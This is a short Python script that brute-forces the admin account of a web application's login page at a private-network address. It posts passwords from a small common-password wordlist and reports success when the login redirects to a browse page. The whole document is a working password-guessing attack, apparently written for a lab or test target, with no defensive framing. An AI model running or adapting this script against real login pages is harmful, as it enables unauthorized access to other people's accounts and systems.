import requests

url = "http://192.168.81.199:8000/accounts/login/"
username = "admin"
wordlist = ["Yash", "admin", "password", "admin123", "letmein", "qwerty",]

for password in wordlist:
    data = {
        "username": 'admin',
        "password": password
    }
    response = requests.post(url, data=data)

    if response.status_code == 302 and "http://192.168.81.199:8000/match/browse/" in response.headers.get("Location", ""):
        print(f"[+] Password found: {password}")
        break
    else:
        print(f"[-] Tried: {password} → Failed")
